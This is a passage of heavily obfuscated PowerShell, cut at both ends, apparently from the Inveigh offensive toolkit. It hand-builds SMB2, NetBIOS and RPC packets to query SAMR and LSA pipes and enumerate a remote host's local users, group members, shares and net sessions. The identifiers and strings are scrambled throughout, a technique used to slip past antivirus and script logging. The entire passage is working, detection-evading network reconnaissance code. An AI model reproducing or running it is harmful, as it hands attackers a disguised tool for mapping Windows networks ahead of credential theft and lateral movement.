                        if(${eN`UmE`R`AT`e`_nETsESSIOn_l`iSt}."c`OUNT" -gt 0 -and ${AcTi`o`N`_ST`AGE} -eq ("{1}{0}{2}" -f'ssi','NetSe','on'))
                        {
                            ${i`N`VEigH}."Outp`UT`_qu`EUE"."A`DD"(("[+] [$(Get-Date -format s)] $target NetSessions: ")) > ${nU`lL}
                            ${Inv`EI`Gh}."OuT`PU`T`_QUeUE".("{1}{0}"-f 'd','Ad').Invoke(${e`NuMEr`AtE`_NE`TseSSIo`N_li`St} -join ",") > ${n`ULl}
                        }

                        ${S`Tage} = ("{0}{1}{3}{2}"-f 'Cl','oseRe','st','que')
                    }

                    ("{0}{1}{2}"-f 'ParseUse','r','s')
                    {
                        [Byte[]]${rE`sponsE_UsE`R_`Co`UN`T_ByT`eS} = ${CLI`ENt_rEc`e`iVe}[148..151]
                        ${reSponS`E_`UsE`R_co`UnT} =   (&("{1}{2}{0}{3}" -f'RIA','get-v','A','blE') ("Xv"+"8"+"qNb")  -VALUE)::("{0}{1}"-f'ToInt','16').Invoke(${R`ESPOnSE_`U`sEr_`coUNT_B`yt`Es},0)
                        ${REs`Po`NsE_U`Se`R_S`TART} = ${reSPO`NS`e_UseR_cO`Unt} * 12 + 172
                        ${rE`sPON`Se`_user_`e`Nd} = ${resPON`s`e`_U`SE`R_`sTArt}
                        ${r`EsPon`Se`_R`ID_s`Ta`Rt} = 160
                        ${rES`PO`NSE_Us`ER`_`lEn`gTH_`s`TarT} = 164
                        ${enu`mEraTe`_`UsEr_LiSt} = &("{0}{2}{3}{1}" -f'Ne','ct','w-O','bje') ("{2}{1}{5}{6}{3}{0}{7}{4}{8}" -f 'ct','yste','S','e','rayLi','m.','Coll','ions.Ar','st')
                        ${i} = 0

                        while(${i} -lt ${reS`P`oNse_U`se`R_cOUnt})
                        {
                            ${RESPo`NsE_USEr_ob`j`ect} = &("{1}{2}{0}"-f'ject','New-','Ob') ("{2}{1}{0}" -f'ect','Obj','PS')
                            [Byte[]]${re`sPOnsE_uSeR`_l`EngtH`_by`T`eS} = ${CL`Ient`_Re`CEI`VE}[${re`sPo`NSe_UseR_`l`eNGtH_S`TArt}..(${Re`SpOns`E_USE`R_L`E`NGt`H_`StarT} + 1)]
                            ${RESpo`Ns`e`_USER_L`enG`Th} =  ( &("{0}{1}{2}" -f'Get','-VAR','iable')  ('xV'+'8QnB')  -VaLU)::("{2}{0}{1}" -f'Int','16','To').Invoke(${respO`Nse_u`sE`R_`LeNgt`H_bY`TES},0)
                            [Byte[]]${rEsPon`Se`_riD_b`Y`TEs} = ${CliE`N`T_r`e`CeIVe}[${r`esP`onS`e_rI`d_s`TART}..(${rEsP`O`Nse_r`id_StaRt} + 3)]
                            ${re`s`pons`E_UsEr_e`Nd} = ${ReS`pOnsE_`UseR_`s`TArT} + ${r`ES`pONse_`US`eR_leNGTH}
                            [Byte[]]${reSPo`NsE`_aCtual_C`OuN`T_`B`Y`T`ES} = ${clIe`Nt_`RE`CEIVE}[(${Respo`NS`e`_USE`R_sT`ART} - 4)..(${Re`sP`onse_use`R_`s`TART} - 1)]
                            ${re`S`PoNsE_`ACt`Ua`L_`COUnt} =   (  &("{3}{0}{1}{2}" -f 'ET-VaRiA','b','lE','g') Xv8qNB  -ValU)::("{1}{2}{0}" -f'6','T','oInt1').Invoke(${rEsPO`NSE_aCT`UaL`_CO`UNt_By`TEs},0)
                            [Byte[]]${rE`SPo`NSe`_uSEr_`B`Yt`ES} = ${CL`i`eN`T_REc`eIVe}[${REsPoN`SE_`U`sER_sTaRt}..(${REspo`NSE_u`SEr_`enD} - 1)]
                            
                            if(${R`es`poNse_`A`ctuAL_CoUnT} % 2)
                            {
                                ${R`esp`ONse_us`er_`stArt} += ${r`Es`ponsE`_uSer_le`NgTh} + 14
                            }
                            else
                            {
                                ${RESPo`N`Se_uSE`R_`sTA`Rt} += ${rESpon`sE_us`E`R_LEngTh} + 12
                            }

                            ${resPO`Nse_u`sER} =  (&("{2}{1}{0}" -f 'eM','dIt','cHIL')  ("VAr"+"iABle:"+"X"+"V8QnB")).VALue::("{1}{0}" -f 'ing','ToStr').Invoke(${Re`SPONS`e_u`ser`_b`yTES})
                            ${rE`sPO`Ns`e_`UsER} = ${ReSPoN`se_uS`ER} -replace "-00",""
                            ${res`poNse`_us`er} = ${rE`sPo`N`SE_USeR}.("{1}{0}" -f'lit','Sp').Invoke("-") | &("{2}{3}{1}{0}" -f'bject','h-O','ForEa','c'){[Char] ( &("{1}{0}{2}"-f'chiLdit','GEt-','em') ('VA'+'Ri'+'ABLE:'+'4vXn')).ValuE::("{1}{0}{2}" -f'oIn','T','t16').Invoke(${_},16)}
                            ${re`spOnsE_`U`SEr} = &("{0}{1}{2}"-f'New-Obj','e','ct') ("{0}{1}{2}" -f'Sy','stem','.String') (${R`esponse`_USEr},0,${r`ES`poNSe_usEr}."len`g`Th")
                            ${RESp`O`NSE_uS`e`R`_lEngth_ST`ArT} = ${RESp`oNSe_`User_L`en`GTH_stA`Rt} + 12
                            ${rESPO`NS`e`_`RId_s`TArT} = ${REspOnSe`_R`iD_S`T`Art} + 12
                            ${i}++

                            if(${rEspoNsE`_`UsER} -ne ("{1}{0}" -f 't','Gues'))
                            {
                                ${E`NUm`Er`AtE_uS`E`R`_lIsT}.("{1}{0}"-f'dd','A').Invoke(${RES`p`ONSE_US`ER}) > ${n`ULl}
                            }

                        }

                        if(${E`N`U`Mer`Ate`_useR_`LIst} -gt 0)
                        {
                            ${I`N`VeIGh}."OU`TP`UT_QUeUE"."A`dd"(("[+] [$(Get-Date -format s)] $target local users: ")) > ${N`ULl}
                            ${iNVE`IgH}."oU`TP`UT_QUE`Ue".("{0}{1}" -f'A','dd').Invoke(${ENum`e`RA`TE_USer_lI`St} -join ",") > ${N`UlL}
                        }

                        ${stA`gE} = ("{0}{3}{1}{2}" -f'C','seRe','quest','lo')
                    }
                
                    ("{2}{3}{4}{0}{5}{1}"-f 'Grou','r','Que','r','y','pMembe')
                    {
                        ${Me`S`SaGe_`ID}++
                        ${s`T`Ag`e_cUrre`Nt} = ${s`TaGE}
                        ${Pa`ckET_sMb_`h`eaDEr} = &("{0}{3}{4}{2}{1}" -f 'New-Pa','er','B2Head','cke','tSM') 0x0b,0x00 0x01,0x00 ${sm`B_siGN`i`NG} ${MEssaG`e`_Id} ${pR`o`cESs`_id} ${tR`eE`_ID} ${seSsiO`N`_Id}
                        ${PacKeT_`sAm`R`_D`AtA} = &("{1}{6}{4}{3}{7}{5}{0}{2}"-f'em','N','ber','MRQ','w-PacketSA','oupM','e','ueryGr') ${groUP_`hA`N`dlE}
                        ${saM`R`_datA} = &("{2}{8}{4}{6}{5}{7}{3}{0}{1}" -f 'cti','onary','Conv','edDi','r','Or','tFrom-Packet','der','e') ${PAcK`e`T_samr_`DaTa} 
                        ${p`A`C`kEt_RPc_DaTa} = &("{1}{2}{0}{3}{4}" -f'tRPCR','New-','Packe','e','quest') 0x03 ${S`AM`R_DAta}."Len`GTH" 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x19,0x00
                        ${PAc`kEt`_S`mb_Da`TA} = &("{0}{4}{6}{7}{5}{3}{1}{2}"-f'New','u','est','ctlReq','-','o','Pa','cketSMB2I') 0x17,0xc0,0x11,0x00 ${fI`lE`_Id} ${SAM`R`_Da`TA}."L`EN`gTh" 4280
                        ${rpc`_d`ATA} = &("{1}{0}{4}{3}{5}{2}{6}"-f'n','Co','ar','deredDict','vertFrom-PacketOr','ion','y') ${pa`CKE`T_R`PC_DAtA}
                        ${S`MB_H`eadeR} = &("{3}{1}{8}{2}{0}{6}{7}{5}{4}"-f'-Pa','n','rom','Co','ary','eredDiction','cke','tOrd','vertF') ${PAC`KeT_SmB`_`HE`ADEr}
                        ${smb`_dAta} = &("{1}{6}{5}{3}{4}{7}{0}{2}" -f'o','Conver','nary','k','e','ac','tFrom-P','tOrderedDicti') ${p`ACkeT`_Sm`B_dATa} 
                        ${rP`C_DAta_`lEng`Th} = ${s`m`B_D`Ata}."Leng`Th" + ${rp`c_DA`Ta}."L`ENG`TH" + ${sa`M`R_dATa}."l`En`gth"
                        ${p`Ack`Et_`NETBIos_se`sSion_`S`eR`Vi`cE} = &("{1}{3}{5}{0}{4}{6}{2}"-f'i','New-Pack','ervice','etNetBIO','on','SSess','S') ${S`Mb_`Head`Er}."LE`NGTh" ${RPC`_`DAtA_`LEN`g`Th}
                        ${n`eTb`iOS_`S`E`SSIOn_`Se`RVice} = &("{1}{7}{3}{6}{0}{4}{5}{2}"-f'dDic','Conver','nary','er','t','io','e','tFrom-PacketOrd') ${P`A`CkE`T_NetBios`_`s`eSSiOn`_`seRVI`ce}
                        ${cL`i`EnT`_SEND} = ${n`eTbI`os_Se`sSiO`N_SeRv`ICE} + ${SMB`_HE`A`DER} + ${Smb`_d`ATA} + ${r`pc_Da`TA} + ${s`Am`R_`dATa}
                        ${S`Tage} = ("{1}{3}{2}{0}"-f'e','SendRec','v','ei')
                    }

                    ("{3}{4}{1}{0}{2}" -f'ue','oReq','st','QueryIn','f')
                    {          
                        ${MeSsA`g`E_ID}++
                        ${s`TaGe_cUrR`E`Nt} = ${s`Ta`Ge}
                        ${p`A`CKEt_SMb`_HEaDeR} = &("{1}{4}{3}{0}{5}{2}"-f'tSMB2He','N','r','-Packe','ew','ade') 0x10,0x00 0x01,0x00 ${s`MB_SigN`inG} ${m`EsSage_`Id} ${pRO`ce`SS`_id} ${tree`_`ID} ${seSsi`o`N_id}
                        ${paC`kEt`_S`MB_`DATA} = &("{6}{4}{1}{5}{2}{7}{0}{3}"-f'R','c','e','equest','-Pa','ketSMB2Qu','New','ryInfo') 0x01 0x05 0x18,0x00,0x00,0x00 0x68,0x00 ${F`ILe_Id}
                        ${S`Mb_`HEA`DeR} = &("{8}{4}{2}{3}{0}{6}{7}{1}{5}"-f 'rtFrom-Pack','Dict','v','e','on','ionary','etOrder','ed','C') ${p`ACk`Et_sm`B_HEADeR}
                        ${s`Mb_dA`Ta} = &("{3}{6}{5}{0}{1}{4}{2}" -f 'e','tOrderedDic','ary','Conver','tion','Pack','tFrom-') ${PACkeT`_SM`B`_D`Ata}    
                        ${pA`CkE`T_nETB`iOS_S`eSsIoN_SeR`VICE} = &("{0}{5}{1}{4}{2}{3}"-f'N','w-PacketN','OSSessionServi','ce','etBI','e') ${sMb_H`eaD`Er}."lEng`Th" ${SmB`_data}."l`eN`gTH"
                        ${neTbIo`S_SESsI`ON`_SeRV`iCe} = &("{6}{2}{3}{4}{1}{5}{7}{0}" -f 'y','cket','onvert','Fro','m-Pa','OrderedDictio','C','nar') ${PaCk`eT`_n`etbi`os_seS`sIon_seR`VIce}
                        ${clI`eNt_S`eNd} = ${nET`Bi`os`_s`eSS`ION_sE`RV`IcE} + ${sMB_`h`Ea`deR} + ${SmB`_datA}
                        ${st`AGe} = ("{3}{0}{1}{2}"-f'ecei','v','e','SendR')
                    }
                
                    ("{1}{0}{3}{2}" -f 'equ','ReadR','st','e')
                    {
                        ${Me`ssage`_iD}++
                        ${StAge_CUr`R`ent} = ${S`TAge}
                        ${PAC`ke`T_`smB`_hEadeR} = &("{2}{1}{0}{3}" -f 'cketSMB2Head','-Pa','New','er') 0x08,0x00 0x01,0x00 ${sm`B_sig`N`ING} ${ME`S`SAge_Id} ${p`RoCeSS`_iD} ${TR`Ee`_iD} ${SEsS`IoN`_Id}
                        ${P`ACKet_`S`Mb_dAta} = &("{2}{0}{1}{3}{5}{4}"-f'etSMB2Rea','dR','New-Pack','eque','t','s') ${FIl`e_`Id}
                        ${PaCK`ET_`S`MB_`Data}[("{1}{0}"-f'ngth','Le')] = 0x00,0x04,0x00,0x00
                        ${sM`B`_heAd`er} = &("{3}{0}{1}{6}{2}{4}{8}{5}{7}"-f'onvertFrom','-Pack','ic','C','t','onar','etOrderedD','y','i') ${pA`CkET_SmB`_hea`DER}
                        ${s`mb_D`Ata} = &("{7}{4}{5}{2}{1}{0}{6}{3}" -f 'Ordered','cket','a','nary','From-','P','Dictio','Convert') ${pAck`E`T`_SMb_DaTA} 
                        ${pAcK`eT`_n`eTb`ios_SEs`sI`oN`_s`e`RvICe} = &("{3}{4}{6}{1}{0}{7}{5}{2}" -f 'tNe','acke','rvice','Ne','w','essionSe','-P','tBIOSS') ${smb_HE`Ad`eR}."L`EnG`TH" ${sM`B`_da`TA}."Len`gtH"
                        ${nEtbio`S_`s`EssIOn_SeRVI`Ce} = &("{4}{1}{0}{2}{5}{6}{3}"-f'ertFrom-Pac','nv','k','onary','Co','etOr','deredDicti') ${P`ACkE`T_`N`E`T`B`ioS_sESSiON_service}
                        ${c`LIEnT_s`end} = ${nE`TBios_`seSSio`N_S`eR`VI`ce} + ${sm`B_Hea`DeR} + ${SM`B_da`TA} 
                        ${sT`A`ge} = ("{3}{1}{2}{0}"-f've','endRe','cei','S')
                    }

                    ("{1}{0}"-f'PCBind','R')
                    {
                        ${mEsS`A`G`E_ID}++
                        ${s`T`A`G`E_cUrrEnT} = ${s`T`AGe}
                        ${pACkeT`_s`mB_h`E`A`DEr} = &("{2}{0}{1}{3}{5}{4}"-f'w-Pa','c','Ne','ket','B2Header','SM') 0x09,0x00 0x01,0x00 ${SmB_`s`IG`Ning} ${mES`sAG`E_id} ${pr`oCesS_`iD} ${Tr`EE_id} ${s`e`ssIOn_iD}
                        ${pacKE`T_RPC`_DA`TA} = &("{1}{2}{0}{3}"-f 'Bi','New-P','acketRPC','nd') ${F`Rag`_`lENGTH} ${cAl`l_`iD} ${n`U`m_CT`X_ITems} 0x00,0x00 ${N`Ame`d`_pi`pE_uUiD} ${Nam`Ed_p`Ipe_UU`ID`_VERSiOn}
                        ${rpC`_`dATA} = &("{10}{8}{4}{1}{0}{5}{6}{9}{7}{2}{3}"-f'k','c','ion','ary','Pa','etOrderedD','i','t','rom-','c','ConvertF') ${pACkEt`_`R`pc_`DAtA}
                        ${p`Ac`kE`T`_`SmB_DATA} = &("{3}{4}{0}{1}{2}"-f '2W','ri','teRequest','New-Pa','cketSMB') ${Fi`L`e_iD} ${R`pC_dA`TA}."Le`NgtH"
                        ${SMb_`he`AdEr} = &("{5}{0}{4}{7}{6}{3}{1}{2}"-f 'rtF','cti','onary','eredDi','rom-Pa','Conve','etOrd','ck') ${PA`ckE`T_`sm`B_HEad`er}
                        ${sm`B_`DA`Ta} = &("{8}{4}{1}{0}{6}{5}{7}{3}{2}" -f'rom-','tF','onary','cti','ver','et','Pack','OrderedDi','Con') ${paCK`e`T_sMB_dAtA} 
                        ${R`Pc_da`TA_lEn`GtH} = ${S`mB`_da`TA}."L`enG`TH" + ${rPc`_DA`Ta}."l`ENgtH"
                        ${PAc`KEt_netb`iOs_`SeSS`Ion`_Se`R`V`ICE} = &("{7}{6}{5}{0}{1}{4}{3}{2}"-f'etBIOSS','essi','ce','nServi','o','N','ket','New-Pac') ${SM`B_`H`eAdER}."LeNg`Th" ${rPc`_datA_`lEn`gTH}
                        ${N`EtB`ios_S`eSsiOn_`ServicE} = &("{2}{0}{3}{4}{7}{5}{8}{1}{6}"-f 'onv','tion','C','ertFro','m','ketOrder','ary','-Pac','edDic') ${paCKe`T_NetBioS_`S`eSSio`N_seRVi`Ce}
                        ${cl`ienT_`s`eND} = ${n`Et`BIoS`_`sE`SsIo`N_sE`RviCe} + ${s`MB_`HEadeR} + ${s`m`B_dA`TA} + ${R`pc_dATA}
                        ${sT`A`gE} = ("{1}{0}{2}"-f'dRecei','Sen','ve') 
                    }

                    ("{1}{3}{2}{0}"-f't','SAMRC','eques','loseR')
                    {
                        ${ME`sSAge`_ID}++
                        ${S`T`Age_C`UR`RENT} = ${st`AGe}
                        ${PAcKE`T_Sm`B`_h`ead`eR} = &("{4}{0}{2}{5}{3}{1}" -f '-','2Header','Pack','tSMB','New','e') 0x0b,0x00 0x01,0x00 ${smB_`sign`iNG} ${MES`s`AGE_`ID} ${PRo`CES`s`_Id} ${t`REE_`ID} ${SESsi`on`_ID}
                        ${P`Acke`T_SaMr_`dAtA} = &("{2}{3}{0}{4}{1}" -f 'tS','RClose','New-Pa','cke','AM') ${samr`_do`main_`HaNDlE}
                        ${Sa`MR_D`A`Ta} = &("{5}{9}{2}{0}{3}{7}{1}{8}{6}{4}"-f 'om-Pac','edD','r','k','nary','Conve','io','etOrder','ict','rtF') ${Pa`c`ket_`sAM`R_DaTA} 
                        ${P`AcKEt_Rpc`_d`ATA} = &("{0}{1}{2}{3}"-f'New-Pac','ketRP','CReq','uest') 0x03 ${s`AMr`_dATA}."len`g`Th" 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x01,0x00
                        ${PaCKeT_sM`B_d`ATa} = &("{6}{4}{5}{1}{3}{0}{2}"-f 'o','MB2','ctlRequest','I','a','cketS','New-P') 0x17,0xc0,0x11,0x00 ${FIL`e_`iD} ${SAm`R_dA`TA}."LE`N`GtH" 4280
                        ${RpC`_d`ATA} = &("{5}{4}{6}{3}{2}{7}{0}{8}{9}{1}"-f'er','y','tOr','cke','v','Con','ertFrom-Pa','d','edDictiona','r') ${p`AcK`et_rPC`_D`ATa}
                        ${Smb_h`E`Ader} = &("{5}{2}{6}{0}{4}{1}{3}" -f'-Packe','i','ertFro','onary','tOrderedDict','Conv','m') ${pAc`K`ET_SMB_Hea`D`eR}
                        ${s`mb_`da`Ta} = &("{8}{7}{6}{2}{10}{9}{0}{3}{5}{1}{4}"-f 'r','D','O','e','ictionary','d','-Packet','m','ConvertFro','e','rd') ${Pa`CK`Et_SMb_DA`TA} 
                        ${rpC`_DA`Ta_L`eNGTH} = ${smB_`DATa}."L`e`NgtH" + ${RPc`_`DAtA}."LEnG`TH" + ${S`AmR_`d`AtA}."lEn`G`Th"
                        ${pA`CKEt_NE`TBi`o`S_S`esSion`_se`Rvi`Ce} = &("{6}{2}{7}{3}{5}{1}{4}{0}"-f 'e','S','ew-P','et','essionServic','BIOS','N','acketN') ${Smb_`H`eAdEr}."le`Ng`Th" ${RP`C_`d`ATa_LengtH}
                        ${netBios_Ses`sI`O`N_`servICe} = &("{2}{3}{0}{8}{4}{5}{7}{6}{1}"-f 'k','ry','Con','vertFrom-Pac','tOr','de','ona','redDicti','e') ${pac`ket`_nEtBiOS_`SESSiON_ser`V`iCE}
                        ${C`liENt`_Se`ND} = ${N`ETBi`oS`_ses`SioN_SErVIce} + ${smb_`He`Ad`ER} + ${SM`B_da`Ta} + ${rP`C_da`TA} + ${sa`m`R`_DAta}
                        ${S`TagE} = ("{1}{2}{0}{3}" -f 'd','Se','n','Receive')
                    }

                    ("{2}{1}{0}"-f 'e','v','SendRecei')
                    {
                        ${C`lIEnT`_sTre`Am}.("{1}{0}" -f 'ite','Wr').Invoke(${cliE`N`T_SE`Nd},0,${cL`i`EnT_s`eNd}."LE`NGTh") > ${Nu`ll}
                        ${ClI`ENT_`STRE`AM}.("{1}{0}"-f 'h','Flus').Invoke()
                        ${ClIent`_stRe`Am}.("{0}{1}"-f'Rea','d').Invoke(${cLI`eNt_R`ecEi`Ve},0,${cLiEn`T_R`eCE`i`Ve}."LENG`TH") > ${n`ULl}

                        if(&("{0}{1}{2}{3}"-f'Get-','St','atusPendin','g') ${cLieN`T_r`EcEiVE}[12..15])
                        {
                            ${St`AGe} = ("{0}{2}{3}{1}{4}"-f 'Status','i','Pen','d','ng')
                        }
                        else
                        {
                            ${st`AgE} = ("{0}{1}{2}"-f'Stat','u','sReceived')
                        }

                    }
            
                    ("{3}{0}{1}{2}" -f'tusPe','nd','ing','Sta')
                    {
                        ${C`LieNt_sT`R`E`AM}.("{1}{0}"-f 'd','Rea').Invoke(${clie`N`T_re`CEive},0,${CLi`ENT_r`eCEIVe}."L`ENgth") > ${Nu`Ll}

                        if( (&("{2}{1}{0}" -f 'E','Abl','varI')  xV8QnB  -vALuEO )::"TOs`T`RINg"(${CLI`e`N`T_REcEIve}[12..15]) -ne ("{2}{1}{0}" -f'-00-00','01','03-'))
                        {
                            ${s`TAgE} = ${sta`Ge_n`eXt}
                        }

                    }

                    ("{1}{3}{2}{4}{0}"-f 'ved','S','a','t','tusRecei')
                    {
                        
                        switch (${S`TAg`e_c`URre`Nt})
                        {

                            ("{0}{1}{2}{3}" -f'CloseR','eque','s','t')
                            {

                                if(${st`ep} -eq 1)
                                {
                                    ${Na`mE`d_pIpe} = 0x73,0x00,0x61,0x00,0x6d,0x00,0x72,0x00 
                                    ${St`Age} = ("{3}{1}{2}{0}"-f 'uest','re','ateReq','C')
                                }
                                elseif(${AC`Tion`_S`TAGe} -eq ("{1}{0}" -f 'e','Shar') -and ${s`h`ARe_lIST}."cou`Nt" -gt 0)
                                {
                                    ${STA`Ge} = ("{3}{1}{2}{0}" -f 't','reeC','onnec','T')
                                }
                                else
                                {
                                    ${ST`A`gE} = ("{1}{2}{0}{3}{4}"-f'isco','T','reeD','nne','ct')
                                }

                            }

                            ("{1}{2}{0}"-f 'ect2','Co','nn')
                            {
                                ${s`TEP}++

                                if(${c`lIEN`T_R`Ec`EIve}[119] -eq 3 -and   (&("{0}{3}{2}{1}" -f 'Ge','lE','B','t-VARiA')  Xv8qnB  -VALuE)::"toS`Tri`NG"(${c`lIeNT_RE`CE`I`Ve}[140..143]) -eq ("{2}{3}{0}{1}" -f'-00-00','-00','0','5'))
                                {
                                    ${r`PC_`A`CCeSS_DeNi`eD} = ${T`Rue}
                                    ${S`TAgE} = ("{0}{2}{3}{1}"-f 'Cl','quest','oseR','e')
                                }
                                else
                                {
                                    ${s`id_`CoUnT} = 0x04,0x00,0x00,0x00
                                    [Byte[]]${SAMr`_COnnECT_`h`ANdLE} = ${CLiEnT`_ReCeI`Ve}[140..159]
                                    ${ST`A`GE} = ("{2}{1}{0}"-f'Domain','n','Ope')
                                }

                            }

                            ("{2}{0}{1}" -f 'nnect','5','Co')
                            {
                                ${St`Ep}++

                                if(${c`lIenT_R`EcE`ive}[119] -eq 3 -and   (  &("{0}{4}{2}{1}{3}" -f 'get','i','d','tem','-chIl') vaRiAble:xV8qNb ).ValUe::"TO`strI`NG"(${CLIeNt`_REc`eIVE}[140..143]) -eq ("{0}{1}{2}"-f'05','-0','0-00-00'))
                                {
                                    ${s`T`AgE} = ("{3}{1}{0}{2}"-f'e','u','st','CloseReq')
                                }
                                else
                                {
                                    ${S`Id_C`ounT} = 0x04,0x00,0x00,0x00
                                    [Byte[]]${samr`_`c`on`NecT_Ha`N`DLE} = ${cLIE`NT_r`Ec`ei`Ve}[156..175]
                                    ${Sta`Ge} = ("{2}{0}{3}{1}" -f'Do','ain','Open','m')
                                }

                            }

                            ("{0}{2}{3}{1}"-f 'Crea','st','t','eReque')
                            {

                                if(${ACTi`on_`STa`ge} -eq ("{1}{0}"-f 'hare','S'))
                                {
                                    ${fr`Ag_len`GTH} = 0x48,0x00
                                    ${C`All_`iD} = 2
                                    ${Nu`m_ctX`_ITEMS} = 0x01
                                    ${nameD`_pIpe_uU`id} = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                                    ${NAMEd_`pi`PE_UuI`D_V`Er`SIon} = 0x03,0x00
                                    ${STag`E`_Next} = ("{3}{1}{0}{2}"-f'Enu','are','mAll','NetSh')
                                }
                                elseif(${Ac`TIOn_s`Tage} -eq ("{0}{1}{2}"-f 'NetS','es','sion'))
                                {
                                    ${F`R`AG_LE`NGTH} = 0x74,0x00
                                    ${cA`l`L_ID} = 2
                                    ${NUM_C`Tx_i`TemS} = 0x02
                                    ${NAmEd`_`pi`PE`_Uuid} = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                                    ${Name`d_`pIpe`_`UUiD`_veRs`IoN} = 0x03,0x00
                                    ${staG`e`_`NEXT} = ("{3}{0}{2}{1}" -f 't','um','SessEn','Ne')
                                }
                                elseif(${s`TEP} -eq 1)
                                {
                                    ${Frag_`LEN`gTH} = 0x48,0x00
                                    ${c`ALL`_Id} = 5
                                    ${nUM`_`c`TX_ITeMS} = 0x01
                                    ${Na`mEd_p`I`pE`_UuiD} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xac
                                    ${n`AM`eD_P`iPE_u`U`iD_Ve`RSI`oN} = 0x01,0x00

                                    if(${AcTi`ON_STa`GE} -eq ("{1}{0}"-f'ser','U'))
                                    {
                                        ${sT`Ag`e_NE`xt} = ("{1}{0}"-f 'nect5','Con')
                                    }
                                    else
                                    {
                                        ${StA`gE_`N`ext} = ("{2}{0}{1}" -f 'c','t2','Conne')
                                    }

                                }
                                elseif(${St`ep} -gt 2)
                                {
                                    ${fRAg_L`E`Ng`TH} = 0x48,0x00
                                    ${CA`ll_`iD} = 14
                                    ${N`UM_`Ctx_i`T`EMS} = 0x01
                                    ${naM`ed_PIP`E`_uUID} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
                                    ${NAmED_pIpE`_`UuiD_`Ver`siON} = 0x00,0x00
                                    ${nAMEd`_P`IPe} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                                    ${S`TaGE`_N`eXT} = ("{2}{1}{0}" -f'licy','OpenPo','LSA')
                                }
                                else
                                {
                                    ${FRag_`lE`NgTH} = 0x48,0x00
                                    ${ca`ll_`ID} = 1
                                    ${NuM_`CTX_ITe`mS} = 0x01
                                    ${NAme`d_p`ip`e`_UUID} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
                                    ${N`Amed_`pIPE`_UU`iD_Ver`Si`ON} = 0x00,0x00
                                    ${nam`eD`_piPe} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                                    ${s`TAGe_N`exT} = ("{2}{3}{0}{1}" -f'OpenP','olicy','LS','A')
                                }

                                ${f`i`LE_Id} = ${CLienT`_R`EcEivE}[132..147]
                        
                                if(${R`E`FResH} -and ${st`A`GE} -ne ("{0}{1}" -f'Exi','t'))
                                {
                                    &("{0}{1}{2}" -f 'Write-O','utpu','t') ("{5}{4}{2}{3}{0}{1}"-f'fre','shed','n',' re','] Sessio','[+') 
                                    ${s`T`AGE} = ("{1}{0}" -f 'xit','E')
                                }
                                elseif(${st`EP} -ge 2)
                                {
                                    ${st`Age} = ("{1}{0}{2}" -f'Bi','RPC','nd')
                                }
                                elseif(${s`TAGE} -ne ("{0}{1}"-f 'E','xit'))
                                {
                                    ${STA`ge} = ("{0}{1}{2}{4}{3}" -f'Qu','er','yInf','quest','oRe')
                                }

                            }

                            ("{0}{1}{3}{2}"-f'En','umDo','nUsers','mai')
                            {
                                ${S`Tep}++
                                ${s`T`Age} = ("{1}{2}{0}"-f's','Par','seUser')
                            }

                            ("{2}{1}{3}{0}" -f 'ersInAlias','etM','G','emb')
                            {
                                ${ST`Ep}++
                                [Byte[]]${si`d_aRr`AY} = ${c`li`ENT_recEivE}[140..( ( &("{1}{2}{0}"-f 'LE','V','ARiAb')  XV8QnB ).vaLUe::"T`oInT16"(${C`li`enT_R`eC`EiVe}[3..1],0) - 1)]
                        
                                if( (&("{0}{1}"-f 'var','IabLe') ("xv"+"8qNb")).VAlUE::"t`osT`RinG"(${cLi`e`Nt_RECe`IVE}[156..159]) -eq ("{1}{2}{0}"-f'-c0','73-00-','00'))
                                {
                                    ${sTA`gE} = ("{1}{0}{4}{2}{3}"-f 'RC','SAM','eq','uest','loseR')
                                }
                                else
                                {
                                    ${n`AM`ed_PIPE} = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 
                                    ${s`TAGe} = ("{2}{1}{0}" -f'est','ateRequ','Cre')
                                }

                            }

                            ("{1}{2}{0}" -f 'f','L','ogof')
                            {
                                ${sta`GE} = ("{0}{1}" -f'Ex','it')
                            }

                            ("{1}{2}{0}"-f 's','LookupN','ame')
                            {
                                ${St`ep}++
                                [Byte[]]${S`A`mR_RID} = ${C`LI`E`Nt_rECe`IvE}[152..155]
                                
                                if(  ( &("{0}{1}" -f'itE','M') ('VarIABl'+'e:XV'+'8QnB')  ).vALUe::"tOStR`I`Ng"(${C`lie`Nt_re`C`eIVE}[156..159]) -eq ("{3}{1}{0}{2}"-f'0','-00-0','-c0','73'))
                                {
                                    ${s`TA`GE} = ("{3}{2}{0}{1}" -f 'seReq','uest','RClo','SAM')
                                }
                                else
                                {
                                    
                                    if(${ST`ep} -eq 4)
                                    {
                                        ${ST`AGE} = ("{1}{0}{2}" -f 'nGr','Ope','oup')
                                    }
                                    else
                                    {
                                        ${S`Ta`gE} = ("{0}{1}{2}{3}"-f 'Open','Ali','a','s')
                                    }

                                }

                            }

                            ("{1}{2}{0}" -f 'ds','Looku','pRi')
                            {
                                ${s`TEP}++
                                ${StA`ge} = ("{0}{1}{2}"-f 'ParseL','o','okupRids')
                            }

                            ("{2}{1}{0}"-f 'e','Clos','LSA')
                            {
                                ${S`T`AGE} = ("{0}{2}{3}{1}"-f 'Cl','t','oseReque','s')
                            }

                            ("{1}{0}{2}"-f'ALookupSi','LS','ds')
                            {
                                ${st`AGe} = ("{3}{0}{2}{1}" -f 'seLooku','Sids','p','Par')
                            }

                            ("{3}{1}{0}{2}"-f'AOpenPol','S','icy','L')
                            {
                                [Byte[]]${p`oL`i`Cy_`HANDlE} = ${CLiEnt_`R`ECE`IVe}[140..159]

                                if(${S`Tep} -gt 2)
                                {
